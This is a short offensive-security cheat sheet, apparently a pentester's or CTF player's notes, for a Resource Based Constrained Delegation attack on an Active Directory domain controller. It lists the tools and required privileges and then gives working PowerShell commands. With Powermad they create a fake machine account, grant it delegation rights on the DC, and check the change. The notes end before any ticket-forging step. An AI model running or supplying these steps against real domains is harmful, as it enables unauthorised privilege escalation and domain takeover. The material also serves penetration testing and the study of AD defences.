## Resource Based Constrained Delegation (RBCD)

## TOOLS: Bloodhound, Powermad, Powerview, Kekeo, Impacket, AD powershell module

### Requirements: Your current user belongs to a group that has write access/generic all privileges on the DC.

### STEPS:

#### 1) Transfer rubeus and powermad on target machine

#### 2) Import-Module ./powermad.ps1 (Import powermad)

#### 3) Import-Module ActiveDirectory

#### 4) Set-Variable -Name "PwnPC" -Value "PWN01"

#### Set-Variable -Name "targetComputer" -Value "DC" (Set variables)

#### 5) New-MachineAccount -MachineAccount (Get-Variable -Name "PwnPC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose ( With powermad, add the new fake computer object to AD)

#### 6) Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "PwnPC").Value + '$') (With built-in AD modules, give the new fake computer object the Constrained Delegation privilege)

#### 7) Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount (With built-in AD modules, check that the last command worked)
